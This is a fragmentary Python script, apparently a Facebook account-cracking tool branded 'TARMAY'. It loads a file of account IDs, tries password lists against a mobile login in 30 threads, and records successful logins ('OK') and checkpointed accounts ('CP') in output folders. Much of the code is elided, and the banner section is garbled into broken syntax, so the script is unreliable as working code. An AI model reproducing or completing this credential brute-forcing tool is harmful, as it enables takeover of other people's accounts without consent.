...
if x.strftime('%x') > g.strftime('%x'):
    print("\033[1;31m TOOL RAGIRA\n\033[1;32m NAMA BNERN @tarmay_shaw1")
    os.system('xdg-open @tarmay_shaw1')
    exit()
...
def banner():
	...
	prin()█╔╝██████╔╝
         ╚═╝     ╚═╝   ╚═╝  ╚═╝      ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═════╝
\x1b[35m_____________________________________________________________
authouR: 𝑻𝑨𝑹𝑴𝑨𝒀 UPDAET🌀)
...
def menu():
	...
	banner()
	print("")
	print(" [ 1 ] 𝑪𝑹𝑨𝑪𝑲 𝑩𝑨 𝑭𝑰𝑳𝑬 ")
	print("")
	𝑻𝑨𝑹𝑴𝑨𝒀 = input(' CHOICE-HALBZHERA= ')
	if 𝑻𝑨𝑹𝑴𝑨𝒀 in ['1','01']:
		FILE()
		exit()
def FILE():
			...
			try:
				...
				print('')
				fileX = input (' \033[1;35m𝑭𝑰𝑳𝑬 𝑫𝑨𝑩𝑵𝑬 = ');os.system('clear');banner()
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackfree,idf,pwv)
	print('')
	print(' \r\r\033[1;92m 𝑶𝑲 = %s '%(ok))
	print('')
	print(' \x1b[1;31m 𝑪𝑷 = %s '%(cp))
	print('')
	exit()
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo} [𝑻𝑨𝑹𝑴𝑨𝒀👌]   {P}{H}{loop} \033[1;32m{P}{P}{H}=\033[1;92m {ok}\r\r\033[1;32m{P} \033[1;31m "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;31m [ 𝑻𝑨𝑹𝑴𝑨𝒀💩-𝑪𝑷 ]\033[1;31m  {idf}\033[1;31m |\033[1;31m {pw}')
				...
				print(f'\r\r\033[1;92m [ 𝑻𝑨𝑹𝑴𝑨𝒀👄-𝑶𝑲 ]\033[1;192m  {idf} \033[1;197m| \033[1;32m{pw}')
...
if __name__=='__main__':
	...
	try:os.mkdir('TezabOK')
	except:pass
	try:os.mkdir('TezabCP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
